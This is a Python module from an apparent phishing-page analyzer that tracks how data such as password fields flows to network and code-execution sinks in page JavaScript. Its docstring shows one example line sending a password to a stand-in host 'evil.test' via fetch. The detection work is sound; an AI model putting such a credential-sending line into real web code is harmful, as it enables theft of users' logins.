"""Source-to-sink relationships: lightweight intra-page taint tracking (task 3).

Part 8: Behavioral intent mapping (sources -> sinks).

Why flows and not single APIs: ``fetch`` is on almost every modern page and
``#password.value`` is read by every login form's validation. What separates
a phishing kit from a bank is that THE PASSWORD REACHES THE REQUEST. This
module follows data from the sources to the sinks (sources_sinks.py) and
records the chain a person can check:

    source  #password.value                         line 16
    assign  pwd = document.getElementById(...).value line 16
    sink    fetch("https://evil.test", {body: JSON.stringify({p: pwd})})  line 18

How (explainable, NOT a JavaScript interpreter):
- Taint is a set of labels per variable; a label is (source, evidence steps,
  encodings, via function?). Variables are (scope, name): the innermost
  function declaring the name, else the page-wide global scope shared by all
  scripts and HTML handlers (``onsubmit="send()"`` sees the inline scripts'
  globals - simple global-name lookup).
- Propagation rules, applied in source order, script by script:
  ``var / let / const / =`` (destructuring: every bound name), ``+=``,
  string concatenation and template literals, object and array literals,
  ``obj.p = v`` taints obj, ``arr.push(v)`` / ``params.append(k, v)`` /
  ``fd.set`` / ``Object.assign`` taint the receiver, ``arr.join()`` and other
  methods of a tainted value stay tainted (not ``.length`` / ``includes()``
  / comparisons, which yield numbers / booleans), JSON.stringify and other
  pass-through calls, encoders (btoa, encodeURIComponent, escape: taint
  passes, the flow is marked "encoded"), ``new URLSearchParams / FormData /
  Blob(x)``, ``f(pwd)`` -> parameter of ``f`` in the page (by name),
  ``return`` -> the call's value, ``.then / .done / forEach`` callbacks get the
  value of their receiver.
- Flow-insensitive but ORDERED: the whole page is passed over again until no
  new taint appears (at most ``max_passes``), so a function defined before
  the line that calls it, or an event handler registered before the
  variable is set, is still covered. Taint only grows, so this terminates.
- Every sink node (from Part 7's detections) checks the taint of its data
  arguments; each tainted label becomes a flow with the label's steps plus
  the sink step.
- Scripts Part 7 could only scan with regexes have no tree: a sensitive
  source and a sink in the same such script give a co-occurrence flow with
  confidence "low".
Confidence: high = direct, short chain (<= 4 steps); medium = through a
function parameter / return / callback or a property write; low = regex-only
script or code inside a parse-error region.

What it cannot see (stated in every result's ``limitations``): dynamic
property names (``obj[k]``), aliasing through object fields (taint is per
variable, not per field), code in external scripts (never fetched), strings
built at run time (``window[a + b]``), values passed through the DOM
(``el.dataset``) or timers' string arguments, and cross-script data except
through global names. Hard caps (sources_sinks.yaml ``limits``): path
length, labels per variable, tainted variables per script, nodes per
expression, time per script and per page - hitting one marks the result
truncated, it never hangs.
"""

from __future__ import annotations

import time
from bisect import bisect_left
from dataclasses import dataclass, field, replace
from typing import Any

from c2_analyzer.behavior.code_index import FunctionInfo, ScriptCtx, pattern_names
from c2_analyzer.behavior.rules import BehaviorRules
from c2_analyzer.behavior.sources_sinks import Catalogue, SinkRef, SourceRef
from c2_analyzer.js_analyzer import syntax as sx
from c2_analyzer.js_analyzer.visitor import AstWalker

WALK_TYPES = frozenset(
    {
        "variable_declarator",
        "assignment_expression",
        "augmented_assignment_expression",
        "call_expression",
        "new_expression",
        "return_statement",
        "arrow_function",
    }
)
COMPARISONS = frozenset({"==", "===", "!=", "!==", "<", ">", "<=", ">=", "instanceof", "in"})
NO_VALUE_UNARY = frozenset({"typeof", "!", "void", "delete"})
RETURN = "<return>"
INTERNAL_SOURCES = frozenset({"decoded_string"})  # not "data": only for obfuscated execution
DECODED_SINKS = frozenset({"code_execution", "html_injection", "download"})


@dataclass(frozen=True)
class Step:
    kind: str  # source | assign | concat | call | encode | sink
    script: int
    line: int
    column: int
    code: str
    note: str | None = None


@dataclass(frozen=True)
class Label:
    source: int  # SourceRef.id
    steps: tuple[Step, ...]
    encodings: tuple[str, ...] = ()
    via_function: bool = False
    via_object: bool = False
    truncated: bool = False
    low: bool = False


Taint = dict[int, Label]


@dataclass
class RawFlow:
    source: SourceRef
    sink: SinkRef
    label: Label
    lexical: bool = False


@dataclass
class FlowResult:
    flows: list[RawFlow] = field(default_factory=list)
    passes: int = 0
    truncated: bool = False
    warnings: list[str] = field(default_factory=list)


class Budget(Exception):
    """The page's time budget is used up."""


class TaintEngine:
    def __init__(
        self,
        rules: BehaviorRules,
        contexts: list[ScriptCtx],
        catalogue: Catalogue,
        registry: dict[str, list[FunctionInfo]],
    ) -> None:
        self.rules = rules
        self.contexts = contexts
        self.catalogue = catalogue
        self.registry = registry
        limits = rules.limits
        self.max_passes = int(limits["max_passes"])
        self.max_steps = int(limits["max_path_steps"])
        self.max_labels = int(limits["max_labels_per_value"])
        self.max_vars = int(limits["max_tainted_vars_per_script"])
        self.max_eval_nodes = int(limits["max_eval_nodes"])
        self.max_eval_depth = int(limits["max_eval_depth"])
        self.script_budget = float(limits["script_time_budget_ms"]) / 1000
        self.page_budget = float(limits["page_time_budget_ms"]) / 1000
        self.code_chars = int(limits["step_code_chars"])
        propagation = rules.propagation
        self.encoders = dict(propagation.get("encoders") or {})
        self.pass_through = frozenset(propagation.get("pass_through") or [])
        self.mutators = frozenset(propagation.get("mutators") or [])
        self.callbacks = frozenset(propagation.get("callbacks") or [])
        self.no_methods = frozenset(propagation.get("non_propagating_methods") or [])
        self.no_props = frozenset(propagation.get("non_propagating_properties") or [])
        self.state: dict[tuple, Taint] = {}
        self.vars_per_script: dict[int, int] = {}
        self.tainted_names: set[bytes] = set()
        self.flows: dict[tuple[int, int], RawFlow] = {}
        self.result = FlowResult()
        self.source_starts: dict[int, list[int]] = {}
        for source in catalogue.sources:
            if source.node is not None and source.ctx is not None:
                self.source_starts.setdefault(source.ctx.index, []).append(source.node.start_byte)
        for starts in self.source_starts.values():
            starts.sort()
        self._labels: dict[int, Label] = {}
        self._evals = 0
        self.deadline = 0.0
        self.script_deadline = 0.0

    # ---- driver -------------------------------------------------------------------

    def run(self) -> FlowResult:
        if not self.catalogue.sources:
            return self.result
        started = time.perf_counter()
        self.deadline = started + self.page_budget
        trees = [ctx for ctx in self.contexts if ctx.tree is not None]
        try:
            for number in range(1, self.max_passes + 1):
                before = self._size()
                for ctx in trees:
                    self._walk(ctx)
                self.result.passes = number
                if self._size() == before:
                    break
            else:
                if self._size() != before:
                    self.result.truncated = True
                    self.result.warnings.append(
                        f"taint still growing after {self.max_passes} passes (flows may be missing)"
                    )
        except Budget:
            self.result.truncated = True
            self.result.warnings.append(
                f"taint analysis stopped at the page time budget ({self.page_budget:.0f} s)"
            )
        self._lexical_flows()
        self.result.flows = list(self.flows.values())
        return self.result

    def _size(self) -> int:
        return sum(len(taint) for taint in self.state.values()) + len(self.flows)

    def _walk(self, ctx: ScriptCtx) -> None:
        self.script_deadline = min(time.perf_counter() + self.script_budget, self.deadline)
        walker = AstWalker(WALK_TYPES, 1500)
        sinks = self.catalogue.sink_at
        seen = 0
        for node, in_error in walker.walk(ctx.tree.root_node):
            seen += 1
            if seen % 256 == 0 and time.perf_counter() > self.script_deadline:
                if time.perf_counter() > self.deadline:
                    raise Budget
                self.result.truncated = True
                self.result.warnings.append(
                    f"script {ctx.index}: taint analysis stopped at the script time budget"
                )
                return
            self.in_error = in_error
            kind = node.type
            if kind == "variable_declarator":
                self._declarator(ctx, node)
            elif kind in ("assignment_expression", "augmented_assignment_expression"):
                self._assignment(ctx, node)
            elif kind == "call_expression":
                self._call(ctx, node)
            elif kind == "return_statement":
                self._return(ctx, node)
            elif kind == "arrow_function":
                body = sx.field(node, "body")
                if body is not None and body.type != "statement_block":
                    self._returns(ctx, node, body)
            key = ctx.key(node)
            if key in sinks:
                for sink_id in sinks[key]:
                    self._sink(ctx, self.catalogue.sinks[sink_id])

    # ---- labels and state -----------------------------------------------------------

    def source_label(self, source_id: int) -> Label:
        if source_id not in self._labels:
            source = self.catalogue.sources[source_id]
            step = Step(
                "source",
                source.ctx.index if source.ctx is not None else -1,
                source.line,
                source.column,
                source.code,
                source.detail,
            )
            self._labels[source_id] = Label(
                source=source_id, steps=(step,), low=source.confidence == "low"
            )
        return self._labels[source_id]

    def step(self, ctx: ScriptCtx, node: Any, kind: str, note: str | None = None) -> Step:
        line, column = ctx.position(node)
        return Step(kind, ctx.index, line, column, ctx.code(node, self.code_chars), note)

    def extend(self, taint: Taint, step: Step, **flags: Any) -> Taint:
        out: Taint = {}
        for source, label in taint.items():
            steps, truncated = label.steps, label.truncated
            last = steps[-1]
            same = (last.script, last.line, last.column, last.kind) == (
                step.script,
                step.line,
                step.column,
                step.kind,
            )
            if not same:  # the very same step again (a later pass) is not a new step
                if len(steps) < self.max_steps - 1:  # room for the sink step
                    steps = steps + (step,)
                else:
                    truncated = True
            encodings = label.encodings
            if flags.get("encoding") and flags["encoding"] not in encodings:
                encodings = encodings + (flags["encoding"],)
            out[source] = replace(
                label,
                steps=steps,
                truncated=truncated,
                encodings=encodings,
                via_function=label.via_function or bool(flags.get("via_function")),
                via_object=label.via_object or bool(flags.get("via_object")),
                low=label.low or bool(getattr(self, "in_error", False)),
            )
        return out

    @staticmethod
    def merge(into: Taint, new: Taint, cap: int) -> bool:
        """Add ``new`` labels; True if a NEW source arrived (shorter paths replace silently)."""
        changed = False
        for source, label in new.items():
            current = into.get(source)
            if current is None:
                if len(into) >= cap:
                    continue
                into[source] = label
                changed = True
            elif len(label.steps) < len(current.steps):
                into[source] = label
        return changed

    def assign(self, ctx: ScriptCtx, target: tuple, taint: Taint, step: Step, **flags) -> None:
        if not taint:
            return
        current = self.state.get(target)
        if current is None:
            count = self.vars_per_script.get(ctx.index, 0)
            if count >= self.max_vars:
                if not self.result.truncated:
                    self.result.warnings.append(
                        f"script {ctx.index}: more than {self.max_vars} tainted variables"
                    )
                self.result.truncated = True
                return
            self.vars_per_script[ctx.index] = count + 1
            current = self.state[target] = {}
            name = target[-1]
            if isinstance(name, str) and name != RETURN:
                self.tainted_names.add(name.encode("utf-8", errors="replace"))
        self.merge(current, self.extend(taint, step, **flags), self.max_labels)

    def lookup(self, target: tuple) -> Taint:
        return self.state.get(target, {})

    # ---- expression taint -------------------------------------------------------------

    def may_taint(self, ctx: ScriptCtx, node: Any) -> bool:
        """Cheap pre-check: a source inside the expression, or a tainted name in its text."""
        starts = self.source_starts.get(ctx.index)
        if starts:
            i = bisect_left(starts, node.start_byte)
            if i < len(starts) and starts[i] < node.end_byte:
                return True
        if not self.tainted_names:
            return False
        if len(self.tainted_names) > 300:
            return True
        text = ctx.src[node.start_byte : node.end_byte]
        return any(name in text for name in self.tainted_names)

    def taint_of(self, ctx: ScriptCtx, node: Any | None) -> Taint:
        if node is None or not self.may_taint(ctx, node):
            return {}
        self._evals = 0
        return self._eval(ctx, node, 0)

    def _union(self, ctx: ScriptCtx, nodes: list[Any], depth: int) -> Taint:
        out: Taint = {}
        for child in nodes:
            if child is not None:
                self.merge(out, self._eval(ctx, child, depth + 1), self.max_labels)
        return out

    def _eval(self, ctx: ScriptCtx, node: Any, depth: int) -> Taint:
        self._evals += 1
        if self._evals > self.max_eval_nodes or depth > self.max_eval_depth:
            return {}
        result: Taint = {}
        found = self.catalogue.source_at.get(ctx.key(node))
        kind = node.type
        if found:
            for source_id in found:
                result[source_id] = self.source_label(source_id)
            decoder = kind == "call_expression" and any(
                self.catalogue.sources[s].source_id == "decoded_string" for s in found
            )
            if not decoder:
                return result  # a source is the data itself
        if kind in sx.FUNCTION_TYPES or kind in ("string", "number", "true", "false", "null"):
            return result
        if kind in ("identifier", "shorthand_property_identifier"):
            self.merge(result, self.lookup(ctx.resolve(sx.text(node, 60), node)), self.max_labels)
            return result
        if kind in ("parenthesized_expression", "sequence_expression"):
            children = [c for c in node.named_children if c.type != "comment"]
            return self._mix(result, self._eval(ctx, children[-1], depth + 1) if children else {})
        if kind in ("member_expression", "subscript_expression"):
            if kind == "member_expression":
                prop = sx.field(node, "property")
                if prop is not None and sx.text(prop, 40) in self.no_props:
                    return result
            return self._mix(result, self._eval(ctx, sx.field(node, "object"), depth + 1))
        if kind == "call_expression":
            return self._mix(result, self._call_value(ctx, node, depth))
        if kind == "new_expression":
            return self._mix(result, self._union(ctx, sx.named_args(node), depth))
        if kind == "binary_expression":
            return self._mix(result, self._binary(ctx, node, depth))
        if kind == "template_string":
            subs = [
                c.named_children[0]
                for c in node.named_children
                if c.type == "template_substitution" and c.named_child_count
            ]
            return self._mix(result, self._union(ctx, subs, depth))
        if kind == "ternary_expression":
            parts = [sx.field(node, "consequence"), sx.field(node, "alternative")]
            return self._mix(result, self._union(ctx, parts, depth))
        if kind == "object":
            values = []
            for child in node.named_children:
                if child.type == "pair":
                    values.append(sx.field(child, "value"))
                elif child.type in ("shorthand_property_identifier", "spread_element"):
                    values.append(child)
            return self._mix(result, self._union(ctx, values, depth))
        if kind == "array":
            return self._mix(result, self._union(ctx, list(node.named_children), depth))
        if kind in ("await_expression", "spread_element", "non_null_expression", "as_expression"):
            children = node.named_children
            return self._mix(result, self._eval(ctx, children[0], depth + 1) if children else {})
        if kind == "assignment_expression":
            return self._mix(result, self._eval(ctx, sx.field(node, "right"), depth + 1))
        if kind == "augmented_assignment_expression":
            parts = [sx.field(node, "left"), sx.field(node, "right")]
            return self._mix(result, self._union(ctx, parts, depth))
        if kind == "unary_expression":
            operator = sx.field(node, "operator")
            if operator is not None and sx.text(operator) in NO_VALUE_UNARY:
                return result
            return self._mix(result, self._eval(ctx, sx.field(node, "argument"), depth + 1))
        return result

    def _mix(self, into: Taint, new: Taint) -> Taint:
        if new:
            self.merge(into, new, self.max_labels)
        return into

    def _binary(self, ctx: ScriptCtx, node: Any, depth: int) -> Taint:
        # flatten the left spine iteratively: "a" + b + "c" + d ... can be thousands long
        operands, current = [], node
        while current is not None and current.type == "binary_expression":
            operator = sx.field(current, "operator")
            if operator is None or sx.text(operator) in COMPARISONS:
                break
            operands.append(sx.field(current, "right"))
            current = sx.field(current, "left")
        else:
            operands.append(current)
            return self._union(ctx, operands, depth)
        if current is node:
            return {}  # a comparison: the result is a boolean, not the data
        operands.append(current)
        return self._union(ctx, operands, depth)

    def _call_value(self, ctx: ScriptCtx, node: Any, depth: int) -> Taint:
        function = sx.field(node, "function")
        if function is None:
            return {}
        path, _ = sx.normalize(
            sx.raw_path(function) or ["?"], frozenset({"window", "self", "globalThis"})
        )
        name, args = path[-1], sx.named_args(node)
        dotted = sx.fmt_path(path)
        encoding = self.encoders.get(dotted)
        if encoding is not None:
            taint = self._union(ctx, args, depth)
            note = f"{dotted} ({encoding})"
            return self.extend(taint, self.step(ctx, node, "encode", note), encoding=encoding)
        if dotted in self.pass_through:
            return self._union(ctx, args, depth)
        if len(path) == 1 and name in self.registry:  # a function defined in the page
            out: Taint = {}
            for info in self.registry[name]:
                self.merge(out, self.lookup((info.key, RETURN)), self.max_labels)
            return out
        if function.type == "member_expression":
            if name in self.no_methods:
                return {}
            receiver = self._eval(ctx, sx.field(function, "object"), depth + 1)
            if name in self.callbacks:
                return receiver
            return self._mix(receiver, self._union(ctx, args, depth))
        return self._union(ctx, args, depth)  # unknown global helper: its result may carry the data

    # ---- effects ----------------------------------------------------------------------

    def _kind_of(self, value: Any) -> str:
        value, _ = sx.unwrap(value)
        if value is None:
            return "assign"
        if value.type in ("binary_expression", "template_string"):
            return "concat"
        if value.type == "call_expression":
            function = sx.field(value, "function")
            path = sx.raw_path(function) or []
            if path and path[-1] in {key.rsplit(".", 1)[-1] for key in self.encoders}:
                return "encode"
        return "assign"

    def _declarator(self, ctx: ScriptCtx, node: Any) -> None:
        value = sx.field(node, "value")
        if value is None:
            return
        taint = self.taint_of(ctx, value)
        if not taint:
            return
        names = pattern_names(sx.field(node, "name"))
        step = self.step(ctx, node, self._kind_of(value), ", ".join(names[:4]))
        for name in names:
            self.assign(ctx, ctx.resolve(name, node), taint, step)

    def _root(self, node: Any) -> Any | None:
        """The variable at the start of a member chain: data in ``data.user.pass``."""
        current = node
        for _ in range(sx.MAX_SEGMENTS):
            if current is None:
                return None
            if current.type == "identifier":
                return current
            if current.type in ("member_expression", "subscript_expression"):
                current = sx.field(current, "object")
            elif current.type == "parenthesized_expression" and current.named_child_count:
                current = current.named_children[-1]
            else:
                return None
        return None

    def _assignment(self, ctx: ScriptCtx, node: Any) -> None:
        left, right = sx.field(node, "left"), sx.field(node, "right")
        if left is None or right is None:
            return
        taint = self.taint_of(ctx, right)
        if not taint:
            return
        kind = "concat" if node.type == "augmented_assignment_expression" else self._kind_of(right)
        if left.type == "identifier":
            name = sx.text(left, 60)
            self.assign(ctx, ctx.resolve(name, node), taint, self.step(ctx, node, kind, name))
            return
        if left.type in ("object_pattern", "array_pattern"):
            step = self.step(ctx, node, kind)
            for name in pattern_names(left):
                self.assign(ctx, ctx.resolve(name, node), taint, step)
            return
        root = self._root(left)
        if root is None:
            return
        root_name = sx.text(root, 60)
        if root_name in ("window", "self", "globalThis") and left.type == "member_expression":
            prop = sx.field(left, "property")
            if prop is not None and sx.field(left, "object") == root:
                name = sx.text(prop, 60)  # window.x = v is the global x
                self.assign(ctx, ctx.resolve(name, node), taint, self.step(ctx, node, kind, name))
            return
        if root_name in ("document", "location", "navigator", "console", "this"):
            return  # element / page properties are sinks (handled there), not variables
        step = self.step(ctx, node, kind, sx.text(left, 60))
        self.assign(ctx, ctx.resolve(root_name, node), taint, step, via_object=True)

    def _call(self, ctx: ScriptCtx, node: Any) -> None:
        function = sx.field(node, "function")
        if function is None:
            return
        path, _ = sx.normalize(
            sx.raw_path(function) or ["?"], frozenset({"window", "self", "globalThis"})
        )
        name, args = path[-1], sx.named_args(node)
        # mutators: arr.push(v), params.append(k, v), Object.assign(target, src)
        if path == ["Object", "assign"] and len(args) >= 2:
            root = self._root(args[0])
            taint = self._union_top(ctx, args[1:])
            if root is not None and taint:
                step = self.step(ctx, node, "assign", sx.text(root, 60))
                self.assign(ctx, ctx.resolve(sx.text(root, 60), node), taint, step, via_object=True)
        elif name in self.mutators and function.type == "member_expression":
            root = self._root(sx.field(function, "object"))
            taint = self._union_top(ctx, args)
            if (
                root is not None
                and taint
                and sx.text(root, 60) not in ("document", "window", "location")
            ):
                step = self.step(ctx, node, "assign", f"{sx.text(root, 60)}.{name}()")
                self.assign(ctx, ctx.resolve(sx.text(root, 60), node), taint, step)
        # f(pwd): the parameters of a function defined in the page
        if len(path) == 1 and name in self.registry and args:
            taints = [self.taint_of(ctx, arg) for arg in args]
            if any(taints):
                for info in self.registry[name]:
                    self._bind(ctx, node, info, taints, f"{name}()")
        # .then(cb) / .forEach(cb): the callback's first parameter receives the value
        if name in self.callbacks and function.type == "member_expression" and args:
            receiver = self.taint_of(ctx, sx.field(function, "object"))
            if receiver:
                for arg in args[:1]:
                    for info in self._functions_of(ctx, arg):
                        self._bind(ctx, node, info, [receiver], f".{name}() callback")

    def _union_top(self, ctx: ScriptCtx, nodes: list[Any]) -> Taint:
        out: Taint = {}
        for child in nodes:
            self.merge(out, self.taint_of(ctx, child), self.max_labels)
        return out

    def _functions_of(self, ctx: ScriptCtx, node: Any) -> list[FunctionInfo]:
        if node.type in sx.FUNCTION_TYPES:
            info = ctx.functions.get(ctx.key(node))
            return [info] if info is not None else []
        if node.type == "identifier":
            return list(self.registry.get(sx.text(node, 60), []))
        return []

    def _bind(self, ctx: ScriptCtx, call: Any, info: FunctionInfo, taints: list[Taint], label: str):
        for position, names in enumerate(info.params):
            if position >= len(taints) or not taints[position]:
                continue
            for name in names:
                note = f"argument {position + 1} -> {name} of {label}"
                step = self.step(ctx, call, "call", note)
                self.assign(ctx, (info.key, name), taints[position], step, via_function=True)

    def _return(self, ctx: ScriptCtx, node: Any) -> None:
        function = ctx.function_of(node)
        value = node.named_children[0] if node.named_child_count else None
        if function is not None and value is not None:
            self._returns(ctx, function, value)

    def _returns(self, ctx: ScriptCtx, function: Any, value: Any) -> None:
        taint = self.taint_of(ctx, value)
        if taint:
            info = ctx.functions.get(ctx.key(function))
            note = f"returned by {info.name}()" if info is not None and info.name else "returned"
            step = self.step(ctx, value, "call", note)
            self.assign(ctx, (ctx.key(function), RETURN), taint, step, via_function=True)

    # ---- sinks ------------------------------------------------------------------------

    def _sink(self, ctx: ScriptCtx, sink: SinkRef) -> None:
        taint = self._union_top(ctx, sink.data_nodes)
        for source_id, label in taint.items():
            self._record(self.catalogue.sources[source_id], sink, label)

    def _record(self, source: SourceRef, sink: SinkRef, label: Label, lexical: bool = False):
        if source.source_id in INTERNAL_SOURCES and sink.sink_id not in DECODED_SINKS:
            return  # a decoded string only matters where it is run, rendered or saved
        key = (source.id, sink.id)
        current = self.flows.get(key)
        if current is None or len(label.steps) < len(current.label.steps):
            self.flows[key] = RawFlow(source, sink, label, lexical)

    def _lexical_flows(self) -> None:
        """Regex-only scripts: a sensitive source and a sink in the same script (low)."""
        by_script: dict[int, list[SinkRef]] = {}
        for sink in self.catalogue.sinks:
            if sink.ctx is not None and sink.ctx.lexical:
                by_script.setdefault(sink.ctx.index, []).append(sink)
        for source in self.catalogue.sources:
            ctx = source.ctx
            if ctx is None or not ctx.lexical or ctx.index not in by_script:
                continue
            for sink in by_script[ctx.index]:
                decoded = source.source_id == "decoded_string"
                if decoded and sink.sink_id not in ("code_execution", "html_injection"):
                    continue
                if not decoded and (
                    source.sensitivity == "low"
                    or sink.sink_id in ("code_execution", "html_injection")
                ):
                    continue
                label = replace(self.source_label(source.id), low=True)
                self._record(source, sink, label, lexical=True)
